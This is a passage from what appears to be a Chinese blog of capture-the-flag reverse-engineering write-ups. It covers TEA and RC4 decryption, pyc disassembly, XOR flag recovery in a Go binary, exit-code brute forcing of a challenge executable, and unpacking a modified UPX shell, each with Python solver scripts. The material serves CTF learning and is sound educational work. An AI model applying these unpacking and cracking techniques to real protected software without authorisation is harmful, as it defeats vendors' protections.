class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt1</span>(<span class="hljs-params">v, k</span>):<br>    v0, v1 = c_uint32(v[<span class="hljs-number">0</span>]), c_uint32(v[<span class="hljs-number">1</span>])<br>    delta = <span class="hljs-number">0x61C88647</span><br>    k0, k1, k2, k3 = k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>]<br>    <br>    total = c_uint32(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        total.value -= delta<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1.value -= ((v0.value &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0.value + total.value) ^ ((v0.value &gt;&gt; <span class="hljs-number">5</span>) + k3)<br>        v0.value -= ((v1.value &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1.value + total.value) ^ ((v1.value &gt;&gt; <span class="hljs-number">5</span>) + k1)<br>        total.value += delta<br>    <span class="hljs-keyword">return</span> v0.value, v1.value<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt2</span>(<span class="hljs-params">v, k</span>):<br>    v0, v1 = c_uint32(v[<span class="hljs-number">0</span>]), c_uint32(v[<span class="hljs-number">1</span>])<br>    delta = <span class="hljs-number">0x9e3779b9</span><br>    k0, k1, k2, k3 = k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>]<br>    <br>    total = c_uint32(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        total.value -= <span class="hljs-number">0x61C88647</span><br>        <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1.value -= ((v0.value &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0.value + total.value) ^ ((v0.value &gt;&gt; <span class="hljs-number">5</span>) + k3)<br>        v0.value -= ((v1.value &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1.value + total.value) ^ ((v1.value &gt;&gt; <span class="hljs-number">5</span>) + k1)<br>        total.value -= delta<br>    <span class="hljs-keyword">return</span> v0.value, v1.value<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 待加密的明文，两个32位整型，即64bit的明文数据</span><br>    value = [<span class="hljs-number">0x60FCDEF7</span>, <span class="hljs-number">0x236DBEC</span>]<br>    <span class="hljs-comment"># 四个key，每个是32bit，即密钥长度为128bit</span><br>    key = [<span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x78</span>]<br>    res = decrypt1(value, key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]))<br>    <br>    <span class="hljs-comment"># 这里是decrypto1 和 decrypto2 的区别</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    如下测试可以发现，加与减的最后4个字节是一样的，这里通过c_uint32的类型锁定了字节的数量</span><br><span class="hljs-string">    也就是高位会被舍去，所以这个的结果是一样的</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    a = c_uint32(<span class="hljs-number">0xc6ef3720</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(a.value + <span class="hljs-number">0x61C88647</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(a.value - <span class="hljs-number">0x9e3779b9</span>))<br></code></pre></td></tr></table></figure><p>这里注意两种方式，一个是 WP 提供的，最后发现就是一个高位舍去的差别，但是开阔了视野</p><h3 id="分析2"><a class="markdownIt-Anchor" href="#分析2"></a> 分析2</h3><ul><li>这里就是 SMC，其中 0x3 就是异或的值。这里将 <code>.hdctf</code> 段进行了 SMC 处理，可以脚本，也可以动调(自己的动调结果有点不太好看)</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304251429980.png" alt="image-20230425142922951" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304251429571.png" alt="image-20230425142926548" /></p><ul><li>这里脚本写出来的就是一个 RC4 加密</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304251434725.png" alt="image-20230425143442690" /></p><ul><li>脚本一直跑不通，然后CyberChef直接就出来了，只能说自己整理得脚本还是不如工具</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304251454112.png" alt="image-20230425145423070" /></p><h2 id="basketball"><a class="markdownIt-Anchor" href="#basketball"></a> Basketball</h2><ul><li>这里主要考虑如何将一堆RGB值变成一张图片</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment"># 打开文件并读取内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;array.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read()<br><br><span class="hljs-comment"># 将文件内容转换为一维数组</span><br>data = np.fromstring(content, dtype=np.uint8, sep=<span class="hljs-string">&#x27; &#x27;</span>)<br><br><span class="hljs-comment"># 将一维数组转换为[561][637][3]的三维数组</span><br>data = data.reshape((<span class="hljs-number">561</span>, <span class="hljs-number">637</span>, <span class="hljs-number">3</span>))<br><br><span class="hljs-comment"># 创建一个空白的图像宽637高561</span><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">637</span>, <span class="hljs-number">561</span>))<br><br><span class="hljs-comment"># 将三维数组中的RGB值写入图像中</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">561</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">637</span>):<br>        r, g, b = data[y][x]<br>        img.putpixel((x, y), (r, g, b))<br><br><span class="hljs-comment"># 保存图像</span><br>img.save(<span class="hljs-string">&#x27;message.png&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="suctf2023"><a class="markdownIt-Anchor" href="#suctf2023"></a> SUCTF2023</h1><h2 id="easyre"><a class="markdownIt-Anchor" href="#easyre"></a> easyRE</h2><ul><li>给了一个exe文件，直接反编译成pyc文件</li></ul><h3 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h3><p>观察 pyinstxtractor 解包时的信息，可知打包的 Python 版本为 Python 3.11所以uncompyle6用不了。对该 pyc 文件进行反编译也需要对应版本的 Python 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> dis<br><span class="hljs-keyword">import</span> marshal<br><br>PATH = <span class="hljs-string">&quot;./easyRE.exe_extracted/easyRE.pyc&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(PATH, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    code = f.seek(<span class="hljs-number">16</span>)<br>    code = marshal.load(f)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;easyRE.pyc.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        dis.dis(code, file=f)<br><br></code></pre></td></tr></table></figure><p>这里也可以使用 pycdc直接生成字节码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>r = random.Random(<span class="hljs-number">322376503</span>)<br><br>pt = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your flag: &#x27;</span>).encode()<br>ct = <span class="hljs-string">b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><br>buf = []<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> pt:<br>    buf.append((r.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>) ^ b))<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">bytes</span>(buf) == ct:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct!&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>大致含义如上，之后就可以写出脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>r = random.Random(<span class="hljs-number">322376503</span>)<br>ct = <span class="hljs-string">b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br>enc = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ct:<br>    enc.append(i)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    flag += <span class="hljs-built_in">chr</span>(r.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>) ^ enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="gotots"><a class="markdownIt-Anchor" href="#gotots"></a> gotots</h2><h3 id="分析-3"><a class="markdownIt-Anchor" href="#分析-3"></a> 分析</h3><p>​使用 IDA fREE 查看 GO 的程序(使用idagohelper会报错)</p><ul><li>利用错误显示 <code>Incorrect!</code> 找到主函数，然后下断点调试到输入的位置</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305071453755.png" alt="image-20230507145353639" /></p><ul><li>经过查找，发现输入的位置是 <code>v13</code> 所在的位置，按 <code>D</code> 改变成数据查看。之后点击进去下一个读写断点(硬件断点)，并在hex窗口显示该地址数据(<code>G</code>)</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305071457015.png" alt="image-20230507145721957" /></p><ul><li>后来在 <code>runtime_stringtoslicebyte</code> 这里触发了读写断点，猜测这里并不是具体的操作过程，之后经过动态调式，发现这个函数复制数据到另一个位置(由hex窗口数据看出)</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305071458161.png" alt="image-20230507145852127" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305071504488.png" alt="image-20230507150454442" /></p><ul><li>经过某一位置发现数值发生了改变，猜测这里就是主要加密位置，根据伪代码可以看出来只是一个简单的异或处理，之后可以发现下面的 <code>if</code> 语句就是判断的含义</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305071506438.png" alt="image-20230507150654384" /></p><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [ <span class="hljs-number">0x35</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x82</span>,<br>  <span class="hljs-number">0x27</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1E</span>,<br>  <span class="hljs-number">0x81</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x6B</span>,<br>  <span class="hljs-number">0x70</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x7D</span>]<br>key = [<span class="hljs-number">0x66</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xD2</span>,<br>  <span class="hljs-number">0x25</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x17</span>,<br>  <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x6D</span>,<br>  <span class="hljs-number">0x79</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2F</span>]<br><br><span class="hljs-built_in">input</span> = [ <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>,<br>  <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>,<br>  <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>,<br>  <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x31</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(key[i] ^ enc[i] ^ <span class="hljs-built_in">input</span>[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br></code></pre></td></tr></table></figure><h3 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充</h3><p>​由于 Go 是多线程的，所以调试的时候可能会出现进入其它未知地方情况的发生，这时可以禁止其余线程的运行</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305071455904.png" alt="image-20230507145550874" /></p><ul><li>不禁止可能走偏，例如下面</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305071501614.png" alt="image-20230507150105577" /></p><h1 id="安洵杯-2023"><a class="markdownIt-Anchor" href="#安洵杯-2023"></a> 安洵杯 2023</h1><h2 id="ez_cpp"><a class="markdownIt-Anchor" href="#ez_cpp"></a> ez_cpp</h2><ul><li><p>对于整个程序的分析可知，该程序使用对于输入字符串进行单个字符加密，之后与内置数据进行对比得出正确与否的结果</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307061640632.png" alt="image-20230706164056589" /></p></li><li><p>因此可以对于比较结果进行更改，利用python运行程序得到结果，从而实现对于单个字符的爆破处理</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307061644516.png" alt="image-20230706164407476" /></p></li><li><p>将每次对比的数值拿出来，从而判断字符的爆破进行到了哪一步</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br>table = string.ascii_letters+string.digits+<span class="hljs-string">&#x27;!-&#123;&#125;&#x27;</span><br>theflag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(theflag) &lt; <span class="hljs-number">32</span>:<br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> table:<br>        flag = (theflag+ch).ljust(<span class="hljs-number">32</span>, <span class="hljs-string">&#x27;#&#x27;</span>)<br>        exitcode = os.system(<span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;flag&#125;</span> | ez_cpp1.exe 1&gt;&amp;0&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;try: &quot;</span> + theflag + ch + <span class="hljs-string">&quot; exitcode:&quot;</span> + <span class="hljs-built_in">hex</span>(exitcode))<br>        <span class="hljs-keyword">if</span> exitcode &gt;= <span class="hljs-built_in">len</span>(theflag) + <span class="hljs-number">1</span>:<br>            theflag += ch<br>            <span class="hljs-built_in">print</span>(theflag, exitcode)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(theflag + <span class="hljs-string">&#x27;not found&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="ezr3"><a class="markdownIt-Anchor" href="#ezr3"></a> ezr3</h2><h3 id="脱壳"><a class="markdownIt-Anchor" href="#脱壳"></a> 脱壳</h3><ul><li><p>首先这是 arm64 elf 文件，运行在Android上，这里查看文件，发现魔改 UPX 壳，之后恢复并脱壳(共5处的HCK需要改成 UPX)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307081737836.png" alt="img" /></p></li></ul><h3 id="逻辑查看"><a class="markdownIt-Anchor" href="#逻辑查看"></a> 逻辑查看</h3><ul><li><p>之后查看main函数逻辑，发现先运行 <code>V</code> 函数，之后再输入flag，查看V函数</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307081739723.png" alt="image-20230708173922681" /></p></li><li><p>这里查看auth数据，同时更改其为4字节一组的数组(上面的memStore也是这样)，之后可以发现此函数只是对内存数据进行了更改，动调可以获得数据，静态查看可以看出加密逻辑(我看不出来，建议还是动态调试拿数据)</p></li><li><p><strong>这里之后再看，发现v2与v3的数据相连，则</strong></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307082009042.png" alt="image-20230708200933003" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">v1 = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        auth[i * <span class="hljs-number">6</span> + j] ^= memStore[v1 + <span class="hljs-number">12</span> * j]<br>    v1 += <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li><li><p>之后主程序是进行一系列对于flag格式的检测工作，之后来到了 <code>P</code> 函数，首先很难理解 v8(输入的flag) 相关的操作，则更改其数据类型，得到可理解的伪代码—这里官方WP是改为37，这是后文memset设置的长度，只要比这个长度大即可满足条件，使代码更容易阅读</p></li><li><p>这里的代码先是对每个数据进行移位处理，之后倒序异或处理；后来就是进行比较，就是将flag与memStore进行相乘来比较flag是否正确</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307081931420.png" alt="image-20230708193153346" /></p><p><strong>这里C中v8[-1]其实指向了v8最开始字符的前一个字符</strong></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307081932216.png" alt="image-20230708193218180" /></p></li></ul><h3 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">auth32 = [<br>    <span class="hljs-number">0x0003BC69</span>, <span class="hljs-number">0x000D3FA0</span>, <span class="hljs-number">0x0003A94A</span>, <span class="hljs-number">0x00044AFF</span>, <span class="hljs-number">0x00045254</span>, <span class="hljs-number">0x0000CDD1</span>,<br>    <span class="hljs-number">0x00001815</span>, <span class="hljs-number">0x00003B08</span>, <span class="hljs-number">0x00070868</span>, <span class="hljs-number">0x000C6560</span>, <span class="hljs-number">0x00065662</span>, <span class="hljs-number">0x000855C8</span>,<br>    <span class="hljs-number">0x0000DCF6</span>, <span class="hljs-number">0x00004CE6</span>, <span class="hljs-number">0x0014EEC2</span>, <span class="hljs-number">0x0002CFD6</span>, <span class="hljs-number">0x00032766</span>, <span class="hljs-number">0x0014F6BA</span>,<br>    <span class="hljs-number">0x00025E69</span>, <span class="hljs-number">0x0006A9A3</span>, <span class="hljs-number">0x00121EBD</span>, <span class="hljs-number">0x0005991C</span>, <span class="hljs-number">0x00050016</span>, <span class="hljs-number">0x00004A3D</span>,<br>    <span class="hljs-number">0x00097485</span>, <span class="hljs-number">0x0008D0A0</span>, <span class="hljs-number">0x0003B916</span>, <span class="hljs-number">0x00054C58</span>, <span class="hljs-number">0x00096F94</span>, <span class="hljs-number">0x00010334</span>,<br>    <span class="hljs-number">0x000DAD22</span>, <span class="hljs-number">0x0004B234</span>, <span class="hljs-number">0x0002FE96</span>, <span class="hljs-number">0x000F33CC</span>, <span class="hljs-number">0x0012C1E8</span>, <span class="hljs-number">0x00148F9E</span><br>]<br>memStore = [<br>    <span class="hljs-number">0x00000D21</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000009D</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000094B</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000003C9</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000C3F</span>,<br>    <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000017E9</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000130E</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000088</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000486</span>, <span class="hljs-number">0x00000000</span>,<br>    <span class="hljs-number">0x0000202F</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00002230</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000024B4</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000008B1</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000A9F</span>,<br>    <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00001AD2</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000023EB</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000C7E</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000042B</span>, <span class="hljs-number">0x00000000</span>,<br>    <span class="hljs-number">0x000005BF</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000113C</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000449</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00001751</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000ACE</span>,<br>    <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00001894</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000208A</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000E82</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000006BD</span>, <span class="hljs-number">0x00000000</span>,<br>    <span class="hljs-number">0x00000CEE</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00002386</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000013D4</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000111</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000D1C</span>,<br>    <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000238E</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00001759</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000012B</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000214D</span>, <span class="hljs-number">0x00000000</span><br>]<br>v2 = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        auth32[i * <span class="hljs-number">6</span> + j] ^= memStore[v2 + <span class="hljs-number">12</span> * j]<br>    v2 += <span class="hljs-number">2</span><br>v2 = <span class="hljs-number">0</span><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        flag.append(auth32[i * <span class="hljs-number">6</span> + j] // memStore[v2 + j * <span class="hljs-number">12</span>])<br>    